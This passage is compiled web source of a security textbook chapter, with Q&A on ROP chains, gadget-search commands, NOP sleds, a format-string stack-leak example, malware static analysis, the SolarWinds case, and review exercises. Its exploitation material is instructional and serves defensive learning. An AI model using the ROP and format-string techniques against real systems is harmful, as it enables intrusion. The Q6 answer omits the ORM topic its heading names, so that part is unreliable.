    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q4-what-is-a-rop-chain-walk-through-building-one",
      children: "Q4: What is a ROP chain? Walk through building one."
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "A:"
      }), " A ROP chain is a sequence of gadget addresses placed on the stack. Each gadget is 2-6 bytes ending in ", (0,jsx_runtime.jsx)(_components.code, {
        children: "ret"
      }), ". Execution flows:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["First ", (0,jsx_runtime.jsx)(_components.code, {
          children: "ret"
        }), " pops gadget1 address → executes ", (0,jsx_runtime.jsx)(_components.code, {
          children: "pop rdi; ret"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Gadget1's ", (0,jsx_runtime.jsx)(_components.code, {
          children: "pop rdi"
        }), " pops the next stack value into rdi → ", (0,jsx_runtime.jsx)(_components.code, {
          children: "ret"
        }), " pops gadget2"]
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Chain continues until the attacker's goal is achieved"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsxs)(_components.strong, {
        children: ["Example chain for ", (0,jsx_runtime.jsx)(_components.code, {
          children: "execve(\"/bin/sh\", NULL, NULL)"
        }), " on x86_64:"]
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "[pop_rdi] → [&\"/bin/sh\"] → [pop_rsi] → [0] → [pop_rdx] → [0] → [pop_rax] → [59] → [syscall]\n"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: ["Each bracket is 8 bytes on the stack. ", (0,jsx_runtime.jsx)(_components.code, {
        children: "ret"
      }), " instructions advance execution through the chain."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q5-how-do-you-find-gadgets-for-a-rop-chain",
      children: "Q5: How do you find gadgets for a ROP chain?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "A:"
      }), " Use automated tools:"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# ropper\nropper --file libc.so.6 --search \"pop rdi\"\nropper --file target_binary --all\n\n# ROPgadget\nROPgadget --binary /usr/lib/libc.so.6 --only \"pop|ret\" | grep rdi\nROPgadget --binary target_binary --opbytes \"0f 05 c3\"  # find syscall; ret\n"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: ["Key gadgets needed: ", (0,jsx_runtime.jsx)(_components.code, {
        children: "pop rdi; ret"
      }), ", ", (0,jsx_runtime.jsx)(_components.code, {
        children: "pop rsi; ret"
      }), ", ", (0,jsx_runtime.jsx)(_components.code, {
        children: "pop rdx; ret"
      }), ", ", (0,jsx_runtime.jsx)(_components.code, {
        children: "pop rax; ret"
      }), ", ", (0,jsx_runtime.jsx)(_components.code, {
        children: "syscall; ret"
      }), ". On x86: ", (0,jsx_runtime.jsx)(_components.code, {
        children: "pop ebx; ret"
      }), ", ", (0,jsx_runtime.jsx)(_components.code, {
        children: "pop ecx; ret"
      }), ", etc."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q6-explain-the-n1-problem-in-orm-database-context-then-explain-nop-sled-overflow-context",
      children: "Q6: Explain the N+1 problem in ORM (database context), then explain NOP sled (overflow context)."
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "A:"
      }), " ", (0,jsx_runtime.jsx)(_components.strong, {
        children: "NOP sled (in overflow context):"
      }), " A sequence of NOP (0x90) instructions placed before shellcode. Instead of guessing the exact address of shellcode, the attacker jumps anywhere in the NOP sled. Execution \"slides\" down the sled to the shellcode. This increases the margin of error for ASLR/stack address variation."]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "[ NOP NOP NOP ... NOP SHELLCODE ]\n  ^ jump here\n  |--- execution slides through NOPs to shellcode\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q7-what-is-the-difference-between-a-virus-and-a-worm",
      children: "Q7: What is the difference between a virus and a worm?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "A:"
      }), " A ", (0,jsx_runtime.jsx)(_components.strong, {
        children: "virus"
      }), " requires a host file (executable, document, boot sector) and human action to spread (opening infected file, running infected program). A ", (0,jsx_runtime.jsx)(_components.strong, {
        children: "worm"
      }), " is self-contained and self-propagating → it spreads across networks without any user action by exploiting vulnerabilities or weak credentials."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "The Morris Worm (1988) is the classic example of a worm: it propagated via fingerd buffer overflow, sendmail DEBUG, and rsh password guessing → all automated, without user interaction."
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q8-how-would-you-analyze-a-suspicious-binary-without-running-it",
      children: "Q8: How would you analyze a suspicious binary without running it?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "A:"
      }), " Static analysis approach:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "File type:"
        }), " ", (0,jsx_runtime.jsx)(_components.code, {
          children: "file malware.exe"
        }), " (PE, ELF, Mach-O, script)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Hashing:"
        }), " SHA256 → search on VirusTotal, MalwareBazaar"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Strings:"
        }), " ", (0,jsx_runtime.jsx)(_components.code, {
          children: "strings malware.exe | grep -i \"http\\|cmd\\|encrypt\\|decrypt\\|registry\""
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "PE analysis:"
        }), " PEStudio checks imports (VirtualAlloc, CreateRemoteThread), entropy (packed?), TLS callbacks, sections"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Disassembly:"
        }), " Ghidra or IDA Free for decompilation"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Dependencies:"
        }), " ", (0,jsx_runtime.jsx)(_components.code, {
          children: "ldd malware.elf"
        }), " or PE imports analysis"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Signature detection:"
        }), " ClamAV scan, YARA rule matching"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q9-what-is-the-secure-software-development-lifecycle-ssdlc",
      children: "Q9: What is the Secure Software Development Lifecycle (SSDLC)?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "A:"
      }), " The SSDLC integrates security into every phase of software development:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Requirements:"
        }), " Define security/privacy needs, abuse cases, compliance"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Design:"
        }), " Threat modeling (STRIDE), security architecture review, attack surface analysis"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Implementation:"
        }), " Secure coding standards, static analysis (SAST), peer code review"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Testing:"
        }), " Dynamic analysis (DAST), fuzz testing, penetration testing, dependency scanning"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Deployment:"
        }), " Hardened configuration, secrets management, immutable infrastructure"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Maintenance:"
        }), " Vulnerability monitoring, patch management, incident response"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q10-explain-the-solarwinds-attack-in-terms-of-the-ssdlc",
      children: "Q10: Explain the SolarWinds attack in terms of the SSDLC."
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "A:"
      }), " The SolarWinds attack exploited failures across multiple SSDLC phases:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Requirements/Design:"
        }), " SolarWinds did not treat their build environment as a critical security boundary. No zero-trust architecture for the build pipeline."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Implementation:"
        }), " The build environment lacked file integrity monitoring → attackers modified source code without detection for months."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Testing:"
        }), " Trojanized DLL passed all SolarWinds QA/QC because it worked correctly. No behavioral analysis or anomaly detection in test phase."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Deployment:"
        }), " Code signing didn't help → the trojanized DLL was signed with SolarWinds' legitimate certificate."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Maintenance:"
        }), " No runtime monitoring of the Orion agent's outbound traffic (blended in with telemetry)."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Key lesson:"
        }), " Supply chain security requires verifying not just the vendor's identity but the integrity of their entire build and delivery pipeline."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q11-how-does-a-format-string-vulnerability-work",
      children: "Q11: How does a format string vulnerability work?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "A:"
      }), " When user input is passed directly as the format string to ", (0,jsx_runtime.jsx)(_components.code, {
        children: "printf"
      }), " (e.g., ", (0,jsx_runtime.jsx)(_components.code, {
        children: "printf(argv[1])"
      }), " instead of ", (0,jsx_runtime.jsx)(_components.code, {
        children: "printf(\"%s\", argv[1])"
      }), "), the attacker can:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Read memory:"
        }), " ", (0,jsx_runtime.jsx)(_components.code, {
          children: "%x%x%x%x"
        }), " reads stack values; ", (0,jsx_runtime.jsx)(_components.code, {
          children: "%s"
        }), " reads arbitrary memory as string"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Write memory:"
        }), " ", (0,jsx_runtime.jsx)(_components.code, {
          children: "%n"
        }), " writes the number of bytes printed so far to an address on the stack"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Exploitation:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "$ ./vuln \"AAAA%x.%x.%x.%x\"\nAAAAffffd500.f7f5f5c0.8048426.41414141    ← AAAA = 0x41414141 leaked from stack\n"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.code, {
        children: "%n"
      }), " can overwrite GOT entries (e.g., redirect ", (0,jsx_runtime.jsx)(_components.code, {
        children: "printf"
      }), " to ", (0,jsx_runtime.jsx)(_components.code, {
        children: "system"
      }), ") or overwrite the return address."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q12-what-tools-would-you-use-for-windows-malware-analysis",
      children: "Q12: What tools would you use for Windows malware analysis?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "A:"
      }), " Sysinternals suite is the standard toolkit:"]
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Tool"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Purpose"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Process Monitor"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Real-time file system, registry, process/thread activity"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Process Explorer"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Detailed process tree, DLL list, handles, network connections"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Autoruns"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "All autostart locations (registry, services, tasks, drivers, BHO)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Strings"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Extract strings from binaries"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Sigcheck"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Check digital signatures, hash files"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "TCPView"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Network connections for each process"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Handle"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Open handles by process"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Workflow:"
      }), " Autoruns → identify persistence → ProcMon → capture behavior → TCPView → C2 destinations → Strings/Sigcheck → in-depth binary analysis."]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "applications-in-real-systems",
      children: "Applications in Real Systems"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Domain"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Application"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "How It Uses This Chapter"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Windows OS"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Windows Defender Exploit Guard"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ASLR, DEP, CFG, SEHOP enforced per-process"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Linux Kernel"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Kernel Self-Protection Project (KSPP)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Stack canaries, FREECON, usercopy hardening"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Browser Security"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Chrome Site Isolation + V8 Sandbox"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ASLR + DEP + CFI to prevent ROP in JavaScript engines"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Cloud Security"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AWS Nitro Enclaves"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Memory isolation, attestation, minimal attack surface"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Embedded Systems"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "TPM Measured Boot"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Boot chain integrity (UEFI Secure Boot → OS loader → kernel)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "AV/EDR"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CrowdStrike Falcon"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Behavioral detection, memory scanning for shellcode signatures"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "IoT Security"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Azure Sphere Pluton security core"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hardware-isolated execution, measured boot, signed updates"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Database Security"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SQL Server Always Encrypted"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "In-enclave decryption, encrypted memory regions"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Mobile Security"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "iOS Code Signing + PAC"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Pointer Authentication Codes (PAC) against ROP"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Game Development"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Anti-cheat systems (EAC, BattlEye)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Kernel drivers, memory integrity checks, hook detection"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "practical-takeaways",
      children: "Practical Takeaways"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Takeaway"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Application"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "OS Hardening"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Apply CIS benchmarks, disable unnecessary services, enable SELinux/AppArmor, configure auditd, and enforce password policies"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Buffer Overflow Prevention"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: ["Use stack canaries, ASLR, DEP/NX, and CFG; compile with ", (0,jsx_runtime.jsx)(_components.code, {
              children: "-fstack-protector"
            }), " and ", (0,jsx_runtime.jsx)(_components.code, {
              children: "-pie"
            }), "; use memory-safe languages where possible"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Shellcode & Exploitation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Understand shellcode generation (msfvenom) and ROP chain construction for penetration testing and defense validation"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Malware Classification & Defense"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Deploy EDR, application whitelisting (AppLocker), AMSI for PowerShell, and memory forensics for rootkit detection"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SSDLC Integration"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Conduct threat modeling (STRIDE) during design, SAST during implementation, DAST/fuzzing during testing, and monitoring in production"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Static & Dynamic Analysis"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Run Flawfinder/RATS for C/C++ SAST, OWASP ZAP for web DAST, and AFL/libFuzzer for coverage-guided fuzzing"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Case Study Lessons"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Patch promptly (WannaCry), segment networks (NotPetya), verify supply chain integrity (SolarWinds), and audit air-gap procedures (Stuxnet)"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "summary",
      children: "Summary"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "OS Hardening"
        }), " reduces attack surface via service removal, kernel parameters, MAC (SELinux/AppArmor), least privilege, and logging."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Buffer Overflows"
        }), " exploit unsafe memory operations in C/C++. Stack overflow overwrites return address; heap overflow corrupts allocator metadata; SEH overflow hijacks exception handling on Windows."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Shellcode"
        }), " is position-independent, null-byte-free machine code. Generate with msfvenom; encode to evade filters."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "ROP"
        }), " bypasses DEP/NX by chaining existing code gadgets. ret2libc calls ", (0,jsx_runtime.jsx)(_components.code, {
          children: "system()"
        }), " directly; full ROP chains execute arbitrary syscalls."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "ASLR"
        }), " randomizes memory layout; bypassed via info leaks (format string, ret2plt) or brute-force (32-bit)."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Malware"
        }), " spans 10+ categories: virus, worm, trojan, ransomware, rootkit, botnet, RAT, spyware, adware, fileless."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "SSDLC"
        }), " embeds security across all phases: threat modeling (STRIDE/DREAD/PASTA), secure coding, fuzzing, SAST/DAST."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Fuzzing"
        }), " (AFL) discovers memory corruption by mutating inputs with coverage feedback."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Static analysis"
        }), " (Flawfinder, RATS) catches bugs early; dynamic analysis (ASan, Valgrind) catches runtime issues."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Case studies"
        }), " (SolarWinds, NotPetya, Stuxnet, Morris Worm) illustrate real-world impact and lessons learned."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "exercises",
      children: "Exercises"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "review-questions",
      children: "Review Questions"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "What four key ASLR bypass techniques exist, and which requires an additional vulnerability?"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\n1) Ret2plt/ret2got (uses PLT/GOT entries, no leak needed for ASLR). 2) Info leak (format string, heap leak — requires additional vulnerability). 3) Brute-force (32-bit: ~2^8 attempts; 64-bit infeasible). 4) Relative memory addressing (offset between stack/heap and code). Info leak is the technique that requires an additional vulnerability.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "2",
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Draw the stack frame for ", (0,jsx_runtime.jsx)(_components.code, {
          children: "void f(char *s) { char buf[16]; gets(buf); }"
        }), " and label the overflow target."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nStack layout (high to low): [saved return address] [saved EBP] [buf[12-15]] [buf[8-11]] [buf[4-7]] [buf[0-3]] (ESP). The overflow target is the saved return address at buf+16 bytes (32-bit) or buf+24 bytes (64-bit with alignment).\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "3",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Explain why DEP prevents classic shellcode injection but fails against ROP."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nDEP (Data Execution Prevention) marks stack and heap as non-executable (NX bit), so injected shellcode cannot run. ROP bypasses DEP by reusing existing executable code (gadgets from loaded libraries/binary) chained together via return addresses — no new code is executed, only existing code.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "4",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "What is the difference between SUNBURST and SUPERNOVA in the SolarWinds attack?"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nSUNBURST was a trojanized Orion DLL (SolarWinds code) — a sophisticated supply-chain backdoor that communicated via disguised HTTP. SUPERNOVA was a separate, unrelated intrusion — a Chinese state-sponsored actor who exploited the same SolarWinds environment using a webshell, but with different TTPs and C2 infrastructure.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "5",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Name three ways NotPetya propagated laterally."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
